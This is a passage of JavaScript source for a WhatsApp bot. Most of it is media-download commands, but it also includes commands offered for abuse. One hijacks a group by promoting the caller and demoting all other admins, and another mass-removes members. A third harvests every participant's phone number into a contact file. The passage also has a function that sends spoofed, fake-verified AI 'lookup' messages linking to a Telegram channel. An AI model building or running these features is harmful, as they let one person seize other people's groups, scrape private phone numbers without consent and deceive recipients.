    await ytdlp(`-f "bestvideo[height<=1080][ext=mp4]+bestaudio[ext=m4a]/best[height<=1080][ext=mp4]/best" --merge-output-format mp4 -o "${fp}" "${args[0]}"`, { timeout: 300000 });
    if (fs.existsSync(fp)) { await sock.sendMessage(sender, { video: fs.readFileSync(fp), mimetype: 'video/mp4', caption: '✅ HD Download', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); try { fs.unlinkSync(fp); } catch(e) {} }
    else throw new Error('download failed');
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}};
builtInCommands.igdl = { desc: '📸 IG download (HD)', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .igdl <url>'), msg);
  return builtInCommands.ig.execute(sock, sender, args, msg);
}};
builtInCommands.fbhd = { desc: '🔷 Facebook HD', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .fbhd <url>'), msg);
  await style.react(sock, sender, msg, '🔷');
  await style.reply(sock, sender, style.wait('Fetching FB HD...'), msg);
  if (!await hasYtdlp()) return style.reply(sock, sender, style.error('yt-dlp required.'), msg);
  const fp = path.join(TMP_DIR, `fbhd_${Date.now()}.mp4`);
  try {
    await ytdlp(`-f "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best" --merge-output-format mp4 -o "${fp}" "${args[0]}"`, { timeout: 180000 });
    if (fs.existsSync(fp)) { await sock.sendMessage(sender, { video: fs.readFileSync(fp), mimetype: 'video/mp4', caption: '✅ FB HD', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); try { fs.unlinkSync(fp); } catch(e) {} }
    else throw new Error('failed');
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}};

async function insta(sock, jid, username) {
  sock.relayMessage(jid, {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [],
          unifiedResponse: {
            data: Buffer.from(JSON.stringify({
              sections: [
                { view_model: { primitives: [ { title: "Ai insta lookup", subtitle: "By Snøwi", secondary_subtitle: "", image: { url: "https://files.catbox.moe/h87kyf.png", mime_type: "image/png" }, entity_id: "123456", entity_url: "t.me/TheSatanicMirror", entity_type: "WEBSITE", action_type: "OPEN_URL", is_verified: true, __typename: "GenAICompactEntityPrimitive" } ], __typename: "GenAIActionRowLayoutViewModel" } },
                { view_model: { primitives: [ { type: "HORIZONTAL_LINE", __typename: "GenAIDividerPrimitive" } ], __typename: "GenAIVStackLayoutViewModel" } },
                { view_model: { primitives: [ { __typename: "GenAISpacerPrimitive" }, { text: "# {{social_entity_1}}See results\0{{/social_entity_1}}    ", inline_entities: [ { key: "social_entity_1", metadata: { __typename: "GenAISocialEntityItem", entity_id: username, entity_name: username, entity_full_name: "NOT found", entity_picture_url: "https://files.catbox.moe/h87kyf.png", entity_url: "https://www.instagram.com/" + username, entity_type: "IG_PROFILE", is_verified: true } } ], __typename: "GenAIMarkdownTextUXPrimitive" }, { __typename: "GenAISpacerPrimitive" } ], __typename: "GenAIActionRowLayoutViewModel" } }
              ]
            })).toString("base64")
          },
          contextInfo: { isForwarded: true, forwardOrigin: 4 }
        }
      }
    }
  }, {});
}

builtInCommands.soundcloud = { desc: '☁️ SoundCloud', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .soundcloud <url>'), msg);
  await style.react(sock, sender, msg, '☁️');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-x --audio-format mp3 --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) { await sock.sendMessage(sender, { audio: { url: u }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); return; } } catch(e) {} }
  const resolved = await resolveMedia(args[0]);
  if (resolved?.url) return sock.sendMessage(sender, { audio: { url: resolved.url }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('SC failed.'), msg);
}};

builtInCommands.spotify = { desc: '🎧 Spotify lookup', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .spotify <song>'), msg);
  await style.react(sock, sender, msg, '🎧');
  try { const r = await axios.get(`https://itunes.apple.com/search?term=${encodeURIComponent(args.join(' '))}&media=music&limit=1`, { timeout: 12000 }); const t = r.data.results?.[0]; if (!t) return style.reply(sock, sender, style.error('No match.'), msg);
    const cap = style.box2('🎧 Spotify', [style.kv('Track', t.trackName), style.kv('Artist', t.artistName), style.kv('Album', t.collectionName), style.kv('Year', new Date(t.releaseDate).getFullYear())].join('\n') + `\n${style.tip(`Use *.play ${t.trackName} ${t.artistName}*`)}`);
    if (t.artworkUrl100) await sock.sendMessage(sender, { image: { url: t.artworkUrl100.replace('100x100', '600x600') }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
    else await style.reply(sock, sender, cap, msg);
  } catch(e) { await style.reply(sock, sender, style.error('Spotify failed.'), msg); }
}};

builtInCommands.pinterest = { desc: '📌 Image search', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .pinterest <query>'), msg);
  await style.react(sock, sender, msg, '📌');
  await sock.sendMessage(sender, { image: { url: `https://loremflickr.com/1080/1080/${encodeURIComponent(args.join(' '))}` }, caption: style.success(`Matches: ${args.join(' ')}`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.yts = { desc: '📺 YT search', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .yts <query>'), msg);
  await style.react(sock, sender, msg, '📺');
  if (await hasYtdlp()) {
    try { const { stdout } = await ytdlp(`--dump-json "ytsearch5:${args.join(' ')}"`, { timeout: 90000 }); let out = ''; stdout.split('\n').filter(Boolean).forEach(l => { try { const it = JSON.parse(l); out += `📌 *${it.title}*\n🔗 https://youtu.be/${it.id}\n👀 ${(it.view_count || 0).toLocaleString()}\n\n`; } catch(e) {} }); return style.reply(sock, sender, style.box('YT RESULTS', out), msg); } catch(e) {}
  }
  try {
    const yt = await axios.get(`https://www.youtube.com/results?search_query=${encodeURIComponent(args.join(' '))}`, { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 15000 });
    const ids = [...yt.data.matchAll(/"videoId":"([a-zA-Z0-9_-]{11})"/g)].slice(0, 5).map(m => m[1]);
    const titles = [...yt.data.matchAll(/"title":\{"runs":\[\{"text":"([^"]+)"/g)].slice(0, 5).map(m => m[1]);
    let out = ''; ids.forEach((id, i) => { out += `📌 *${titles[i] || id}*\n🔗 https://youtu.be/${id}\n\n`; });
    await style.reply(sock, sender, style.box('YT RESULTS', out || 'None.'), msg);
  } catch(e) { await style.reply(sock, sender, style.error('YT failed.'), msg); }
}};

builtInCommands.tourl = { desc: '🔗 Image → Telegra.ph', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.imageMessage && !q?.imageMessage) return style.reply(sock, sender, style.error('Reply to image.'), msg);
  await style.react(sock, sender, msg, '🔗');
  try { const buf = await downloadMsg(sock, msg); if (!buf) throw new Error('dl'); const form = new FormData(); form.append('file', buf, { filename: 'v.jpg', contentType: 'image/jpeg' }); const r = await axios.post(TELEGRAPH_UPLOAD, form, { headers: form.getHeaders(), timeout: 30000 }); await style.reply(sock, sender, style.success(`URL: https://telegra.ph${r.data[0].src}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Upload failed.'), msg); }
}};

builtInCommands.apk = builtInCommands.app = { desc: '📦 APK download', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .apk <name>'), msg);
  await style.react(sock, sender, msg, '📦');
  await style.reply(sock, sender, style.wait('Searching APK...'), msg);
  try {
    const s = await axios.get(`https://ws75.aptoide.com/api/7/apps/search?query=${encodeURIComponent(args.join(' '))}&limit=1`, { timeout: 20000 });
    const app = s.data?.datalist?.list?.[0]; if (!app) return style.reply(sock, sender, style.error('No APK.'), msg);
    const url = app.file?.path || app.file?.path_alt; if (!url) return style.reply(sock, sender, style.error('No URL.'), msg);
    const sizeMb = app.file?.filesize ? (app.file.filesize / 1024 / 1024).toFixed(2) + ' MB' : '?';
    const apk = await axios.get(url, { responseType: 'arraybuffer', timeout: 120000, headers: { 'User-Agent': 'Mozilla/5.0' } });
    await sock.sendMessage(sender, { document: Buffer.from(apk.data), mimetype: 'application/vnd.android.package-archive', fileName: `${(app.name || 'app').replace(/[^a-z0-9]/gi, '_')}_v${app.file?.vername || 'latest'}.apk`, caption: style.box2('📦 APK', [style.kv('App', app.name), style.kv('Size', sizeMb)].join('\n')), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
    await style.react(sock, sender, msg, '✅');
  } catch(e) { await style.reply(sock, sender, style.error('APK failed: ' + e.message), msg); }
}};

builtInCommands.mediafire = { desc: '📦 MediaFire', execute: async (sock, sender, args, msg) => {
  if (!args[0] || !/mediafire\.com/i.test(args[0])) return style.reply(sock, sender, style.error('Usage: .mediafire <url>'), msg);
  await style.react(sock, sender, msg, '📦');
  try { const page = await axios.get(args[0], { timeout: 20000, headers: { 'User-Agent': 'Mozilla/5.0' } }); const match = page.data.match(/id="downloadButton"[^>]*href="([^"]+)"/i) || page.data.match(/href="(https:\/\/download[0-9]+\.[^"]+)"/i); if (!match) return style.reply(sock, sender, style.error('Link not found.'), msg); await sock.sendMessage(sender, { document: { url: match[1].replace(/&amp;/g, '&') }, mimetype: 'application/octet-stream', fileName: 'mediafire_file', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('MF failed.'), msg); }
}};

builtInCommands.ytmp3 = { desc: '🎵 YT → MP3 (by URL)', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ytmp3 <url>'), msg);
  return playExecute(sock, sender, [args[0]], msg);
}};

builtInCommands.tiktokaudio = builtInCommands.tta = { desc: '🎵 TikTok audio', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ttaudio <url>'), msg);
  await style.react(sock, sender, msg, '🎵');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-x --audio-format mp3 --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { audio: { url: u }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { audio: { url: r.url }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('Failed.'), msg);
}};

builtInCommands.capcut = { desc: '✂️ CapCut template', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .capcut <url>'), msg);
  await style.react(sock, sender, msg, '✂️');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`--no-playlist -f "best" --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { video: { url: r.url }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('CapCut failed.'), msg);
}};

builtInCommands.pindl = { desc: '📌 Pinterest download', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .pindl <pin url>'), msg);
  await style.react(sock, sender, msg, '📌');
  try { const r = await axios.get(args[0], { timeout: 15000, headers: { 'User-Agent': 'Mozilla/5.0' } }); const m = r.data.match(/property="og:image"\s+content="([^"]+)"/i) || r.data.match(/property="og:video"\s+content="([^"]+)"/i); if (!m) return style.reply(sock, sender, style.error('Not found.'), msg); const u = m[1]; if (/\.mp4/i.test(u)) await sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await sock.sendMessage(sender, { image: { url: u }, caption: '📌 Pinterest', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.twitteraudio = builtInCommands.xa = { desc: '🐦 Twitter audio', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .xaudio <url>'), msg);
  await style.react(sock, sender, msg, '🐦');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-x --audio-format mp3 --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { audio: { url: u }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { audio: { url: r.url }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('Failed.'), msg);
}};

builtInCommands.spotifydl = builtInCommands.spdl = { desc: '🎧 Spotify download (via YT)', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .spdl <song>'), msg);
  return playExecute(sock, sender, args, msg);
}};

builtInCommands.soundclouddl = builtInCommands.scdl = { desc: '☁️ SoundCloud download', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .scdl <url>'), msg);
  return builtInCommands.soundcloud.execute(sock, sender, args, msg);
}};

builtInCommands.vimeo = { desc: '📺 Vimeo download', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .vimeo <url>'), msg);
  await style.react(sock, sender, msg, '📺');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-f "best[ext=mp4]/best" --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { video: { url: r.url }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('Failed.'), msg);
}};

builtInCommands.dailymotion = builtInCommands.dm = { desc: '🎬 Dailymotion', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .dm <url>'), msg);
  await style.react(sock, sender, msg, '🎬');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-f "best[ext=mp4]/best" --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { video: { url: r.url }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('Failed.'), msg);
}};

builtInCommands.twitch = { desc: '🎮 Twitch clip', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .twitch <clip url>'), msg);
  await style.react(sock, sender, msg, '🎮');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-f "best[ext=mp4]/best" --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { video: { url: u }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { video: { url: r.url }, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('Failed.'), msg);
}};

builtInCommands.redditaudio = builtInCommands.ra = { desc: '🔊 Reddit audio', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ra <url>'), msg);
  await style.react(sock, sender, msg, '🔊');
  if (await hasYtdlp()) { try { const { stdout } = await ytdlp(`-x --audio-format mp3 --get-url "${args[0]}"`, { timeout: 90000 }); const u = stdout.trim().split('\n')[0]; if (u?.startsWith('http')) return sock.sendMessage(sender, { audio: { url: u }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {} }
  const r = await resolveMedia(args[0]); if (r?.url) return sock.sendMessage(sender, { audio: { url: r.url }, mimetype: 'audio/mpeg', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  await style.reply(sock, sender, style.error('Failed.'), msg);
}};

builtInCommands.mega = { desc: '📦 Mega.nz info', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .mega <mega url>'), msg);
  await style.react(sock, sender, msg, '📦');
  try { const id = args[0].split('!')[1] || ''; await axios.post('https://g.api.mega.co.nz/cs', [{ a: 'g', p: id }], { timeout: 15000 }); await style.reply(sock, sender, style.box('📦 MEGA', `File ID: ${id || '?'}\n\nOpen in browser or use mega app.`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Mega failed.'), msg); }
}};

/* ── SPECIAL / CORE ── */
builtInCommands.summon = { desc: '☣️ Summon Core', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '☣️');
  let m = await sock.sendMessage(sender, { text: '╭━━━𓆩『☣️』SUMMON𓆪━━━╮\n> 𓂀 *INITIATING...*\n╰━━━━━━━╯' }, { quoted: msg });
  const steps = ['NEURAL CORE: ONLINE', 'SUB-ROUTINES: LOADING', 'QUANTUM LINK: ESTABLISHED', 'SCARAB PROTOCOL: ACTIVE', 'ALL SYSTEMS: SYNCHRONIZED'];
  for (const s of steps) { await delay(500); try { await sock.sendMessage(sender, { text: `╭━━━𓆩『☣️』SUMMON𓆪━━━╮\n> 𓂀 *STATUS:* ${s}\n╰━━━━━━━╯`, edit: m.key }); } catch(e) {} }
  await delay(700);
  try { await sock.sendMessage(sender, { text: `╭━━━𓆩『☣️』AWAKENED𓆪━━━╮\n> 𓂀 *STATUS:* 𓆣 ONLINE\n> 𓂀 *POWER:* MAXIMUM\n╰━━━━━━━╯`, edit: m.key }); } catch(e) {}
}};

builtInCommands.selfdestruct = { desc: '☣️ Self-destruct', execute: async (sock, sender, args, msg) => {
  if (destructActive) return style.reply(sock, sender, style.error('Already running.'), msg);
  destructActive = true;
  await style.react(sock, sender, msg, '☣️');
  let m = await sock.sendMessage(sender, { text: 'ARMING...' }, { quoted: msg });
  for (let i = 10; i >= 0; i--) { await delay(1000); const bar = '█'.repeat(10 - i) + '░'.repeat(i); try { await sock.sendMessage(sender, { text: `╭━『 ☣️ DESTRUCT 』━╮\n> Timer: ${i}s\n> [${bar}]\n╰━━━━━━━ ☉`, edit: m.key }); } catch(e) {} }
  try { await sock.sendMessage(sender, { text: '☣️ SHUTDOWN COMPLETE\n> Type .reboot', edit: m.key }); } catch(e) {}
  setTimeout(() => destructActive = false, 5000);
}};

builtInCommands.reboot = { desc: '🔄 Reboot', execute: async (sock, sender, args, msg) => { destructActive = false; await style.react(sock, sender, msg, '🔄'); await style.reply(sock, sender, style.banner('Reboot', 'Core restored 𓆣'), msg); } };

builtInCommands.godmode = { desc: '☣️ Godmode', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '☣️');
  if (args[0] === 'off') { godmodeGroups.delete(sender); return style.reply(sock, sender, style.success('GODMODE OFF'), msg); }
  godmodeGroups.add(sender);
  const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const meta = await sock.groupMetadata(sender);
  if (!meta.participants.find(p => p.id === botJid)?.admin) return style.reply(sock, sender, style.error('Make me admin.'), msg);
  try { await sock.groupSettingUpdate(sender, 'announcement'); } catch(e) {}
  await style.reply(sock, sender, style.success('GODMODE ON.'), msg);
}};

builtInCommands.kickall = { desc: '☣️ Kick non-admins', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '☣️');
  try { const meta = await sock.groupMetadata(sender); const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'; const targets = meta.participants.filter(p => !p.admin && p.id !== botId).map(p => p.id); let n = 0; for (const t of targets) { try { await sock.groupParticipantsUpdate(sender, [t], 'remove'); n++; await delay(300); } catch(e) {} } await style.reply(sock, sender, style.success(`Removed ${n}.`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.wipe = { desc: '☣️ Wipe caches', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '☣️'); messageCache.clear(); spamTracker.clear(); await style.reply(sock, sender, style.success('Wiped.'), msg); } };

builtInCommands['hack bot info'] = { desc: '☣️ Telemetry', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '☣️');
  await style.reply(sock, sender, style.box('INTEL', [style.kv('Name', BOT_NAME), style.kv('Ver', VERSION), style.kv('Uptime', process.uptime().toFixed(0) + 's'), style.kv('Platform', `${os.platform()} ${os.arch()}`), style.kv('Node', process.version), style.kv('RAM', (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + ' MB')].join('\n')), msg);
}};

builtInCommands['take gc contacts'] = { desc: '☣️ Harvest VCF', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '☣️');
  const w = await sock.sendMessage(sender, { text: '⏳ Harvesting...' }, { quoted: msg });
  try { const meta = await sock.groupMetadata(sender); let vcf = ''; for (const p of meta.participants) { const n = p.id.split('@')[0]; vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${p.notify || p.name || n}\nTEL;type=CELL;type=VOICE;type=pref:${n}\nEND:VCARD\n`; } try { await sock.sendMessage(sender, { delete: w.key }); } catch(e) {} await sock.sendMessage(sender, { document: Buffer.from(vcf), mimetype: 'text/vcard', fileName: `${meta.subject.replace(/[^a-z0-9]/gi, '_')}.vcf`, caption: style.success(`${meta.participants.length} contacts.`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.demandlock = { desc: '☣️ 3s lock', execute: async (sock, sender, args, msg) => {
  const jid = msg.key.remoteJid;
  if (!jid.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const meta = await sock.groupMetadata(jid);
  const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const isAdmin = meta.participants.find(p => p.id === botJid)?.admin;
  await style.reply(sock, sender, style.warning('Locking in 3s...'), msg);
  setTimeout(async () => {
    try { if (isAdmin) { await sock.groupSettingUpdate(jid, 'announcement'); await sock.sendMessage(jid, { text: style.success('LOCKED.') }); } else throw new Error(''); }
    catch(e) { await sock.sendMessage(jid, { text: style.warning('Not admin — lockdown mode ON.') }); demandLockGroups.add(jid); }
  }, 3000);
}};

builtInCommands.demandunlock = { desc: '🔓 Unlock', execute: async (sock, sender, args, msg) => { demandLockGroups.delete(msg.key.remoteJid); await sock.sendMessage(msg.key.remoteJid, { text: style.success('Unlocked.') }); } };

builtInCommands.grouphijack = { desc: '☣️ Hijack group', execute: async (sock, sender, args, msg) => {
  const jid = msg.key.remoteJid;
  if (!jid.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '☣️');
  const g = await sock.groupMetadata(jid);
  const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const me = g.participants.find(p => p.id === (msg.key.participant || sender));
  const bot = g.participants.find(p => p.id === botJid);
  if (!bot?.admin) return style.reply(sock, sender, style.error('Need admin first.'), msg);
  if (!me?.admin) { try { await sock.groupParticipantsUpdate(jid, [msg.key.participant || sender], 'promote'); await sock.sendMessage(jid, { text: style.success('You are admin now.') }); } catch(e) {} return; }
  const others = g.participants.filter(p => p.admin && p.id !== me.id && p.id !== botJid);
  if (others.length) { try { await sock.groupParticipantsUpdate(jid, others.map(p => p.id), 'demote'); } catch(e) {} }
  await sock.sendMessage(jid, { text: style.success('Coup complete.') });
}};

/* ── CODE ── */
builtInCommands['code html'] = { desc: '💀 HTML', execute: async (s, a, r, m) => { await style.react(s, a, m, '💀'); await style.reply(s, a, style.box('HTML', fonts.mono(await generateCode('HTML', r.join(' ')))), m); } };
builtInCommands['code cc+'] = { desc: '💀 C++', execute: async (s, a, r, m) => { await style.react(s, a, m, '💀'); await style.reply(s, a, style.box('C++', fonts.mono(await generateCode('C++', r.join(' ')))), m); } };
builtInCommands['code js'] = { desc: '💀 JS', execute: async (s, a, r, m) => { await style.react(s, a, m, '💀'); await style.reply(s, a, style.box('JS', fonts.mono(await generateCode('JavaScript', r.join(' ')))), m); } };
builtInCommands['code python'] = { desc: '💀 Python', execute: async (s, a, r, m) => { await style.react(s, a, m, '💀'); await style.reply(s, a, style.box('PYTHON', fonts.mono(await generateCode('Python', r.join(' ')))), m); } };

/* ── RECON ── */
builtInCommands.sysinfo = { desc: '🖥️ System', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🖥️');
  const cpus = os.cpus();
  await style.reply(sock, sender, style.box('SYSTEM', [style.kv('Host', os.hostname()), style.kv('Platform', `${os.platform()} ${os.arch()}`), style.kv('CPUs', `${cpus.length} × ${cpus[0]?.model}`), style.kv('RAM', (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB'), style.kv('Free', (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + ' GB'), style.kv('Node', process.version)].join('\n')), msg);
}};

builtInCommands.trace = builtInCommands.find = { desc: '🛰️ IP lookup', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .trace <ip>'), msg);
  await style.react(sock, sender, msg, '🛰️');
  try { const r = await axios.get(`http://ip-api.com/json/${encodeURIComponent(args[0])}`, { timeout: 10000 }); if (r.data.status === 'fail') return style.reply(sock, sender, style.error('Failed.'), msg); const d = r.data; await style.reply(sock, sender, style.box('TRACE', [style.kv('IP', d.query), style.kv('Country', d.country), style.kv('Region', d.regionName), style.kv('City', d.city), style.kv('ISP', d.isp), style.kv('Lat/Lon', `${d.lat}, ${d.lon}`)].join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.whois = { desc: '🔎 WHOIS', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .whois <domain>'), msg);
  await style.react(sock, sender, msg, '🔎');
  try { const dom = args[0].replace(/^https?:\/\//, '').split('/')[0]; const r = await axios.get(`https://rdap.org/domain/${encodeURIComponent(dom)}`, { timeout: 12000 }); const reg = r.data.entities?.find(e => e.roles?.includes('registrar'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3] || 'Unknown'; await style.reply(sock, sender, style.box('WHOIS', [style.kv('Domain', r.data.ldhName || dom), style.kv('Registrar', reg)].join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('WHOIS failed.'), msg); }
}};

builtInCommands.shorturl = { desc: '🔗 Short URL', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .shorturl <url>'), msg);
  await style.react(sock, sender, msg, '🔗');
  try { const r = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(args[0])}`, { timeout: 10000 }); await style.reply(sock, sender, style.box('SHORT', r.data), msg); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.qrcodegen = { desc: '🔳 Text → QR', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .qrcodegen <text>'), msg);
  await style.react(sock, sender, msg, '🔳');
  await sock.sendMessage(sender, { image: { url: `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(args.join(' '))}` }, caption: style.success(`QR: ${args.join(' ')}`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.qr = { desc: '📱 Pair QR (number) / Text QR', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .qr <number> to pair, or .qr <text> for text QR'), msg);
  const raw = args[0].replace(/[^0-9]/g, '');
  if (/^\d{10,15}$/.test(raw) && args.length === 1) {
    await style.react(sock, sender, msg, '📱');
    const clean = raw;
    if (activePairs.has(clean)) return style.reply(sock, sender, style.error('Already pairing.'), msg);
    const sessionPath = path.join(PAIR_SESSIONS_DIR, `session-${clean}`);
    if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
    fs.mkdirSync(sessionPath, { recursive: true });
    const load = await sock.sendMessage(sender, { text: `🌌 Starting QR session for +${clean}...` }, { quoted: msg });
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
